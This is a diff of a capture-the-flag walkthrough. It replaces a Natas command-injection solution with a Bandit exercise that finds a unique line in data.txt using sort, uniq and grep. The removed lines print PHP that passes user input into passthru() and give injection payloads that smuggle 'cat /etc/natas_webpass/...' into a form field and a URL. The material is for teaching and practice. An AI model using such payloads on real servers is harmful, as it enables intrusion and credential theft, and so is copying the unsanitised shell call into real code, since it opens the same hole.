@@ -1,72 +1,72 @@
-# Natas Level 8 → Level 9
+# OverTheWire Bandit — Level 8 → Level 9
 
-**Goal:** 
+**Objective**
 
-Find the password for natas10. This level passes user input directly into a shell command (grep), making it vulnerable to command injection.
+*The password is stored in data.txt and is the only line that occurs exactly once.*
 
-# Step 1: Access the level
+# Step 1 — Connect
 
-http://natas9.natas.labs.overthewire.org
-
-Username: natas9
-Password: (from level 7)
-
-# Step 2: Read the page
-
-There's a form that lets you search a "dictionary", you type a word and it searches for it within a wordlist file.
-
-# Step 3: View the PHP source code
-
-You'll see something like:
-
-```php
-<?
-$key = "";
-
-if(array_key_exists("needle", $_REQUEST)) {
-    $key = $_REQUEST['needle'];
-}
-
-if($key != "") {
-    passthru("grep -i $key dictionary.txt");
-}
-?>
+```bash
+ssh bandit8@bandit.labs.overthewire.org -p 2220
 ```
 
-The $_REQUEST['needle'] value is inserted directly into a shell command via passthru(), with no sanitization. This means you can inject additional shell commands using shell metacharacters like ;, &&, or |.
+# Step 2 — Check the File
 
-# Step 4: Craft a command injection payload
+```bash
+ls
+```
 
-Since the base command is:
+Output:
 
-`grep -i <needle> dictionary.txt`
+```bash
+data.txt
+```
 
-You can break out of it and run your own command. For example, to read the password file:
+# Step 3 — Find the Unique Line
 
-`; cat /etc/natas_webpass/natas10 ;`
+Use:
 
-Or using a pipe to terminate grep cleanly:
+```bash
+sort data.txt | uniq -c | grep '^ *1 '
+```
 
-`anything; cat /etc/natas_webpass/natas10`
+**Explanation**
 
-# Step 5: Submit the payload
+`sort data.txt` → sorts the lines.
 
-In the "needle" input field on the natas9 page, enter:
+`uniq -c` → counts occurrences.
 
-`; cat /etc/natas_webpass/natas10 ;`
+`grep '^ *1 '` → shows only lines occurring once.
 
-Then submit the form.
+Output:
 
-(You can also do this via URL directly since it's a GET/REQUEST param:)
+1 <Bandit Level 9 Password>
 
-http://natas9.natas.labs.overthewire.org/index.php?needle=;cat+/etc/natas_webpass/natas10;
+*The value after 1 is the password for Bandit Level 9.*
 
-# Step 6: Get the password
 
-The output will include the grep results (likely empty/error) plus the contents of the password file:
+**Understanding the Regex**
 
-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+The pattern is:
 
-*Lesson learned*
+`^ *1`
 
-Passing user input directly into shell commands (via passthru, exec, system, shell_exec, etc.) is extremely dangerous. It allows attackers to inject and execute arbitrary commands on the server. User input should never be concatenated into shell commands; use parameterized/escaped functions (like escapeshellarg()) or, better, avoid shelling out entirely when possible.
+It can be understood as:
+
+- ^ → start of the line
+
+- * → zero or more spaces
+
+- 1 → the count must be 1
+
+The final space separates the count from the actual line
+
+So:
+
+```bash
+grep '^ *1 '
+```
+
+means:
+
+Find lines where the occurrence count is exactly 1.
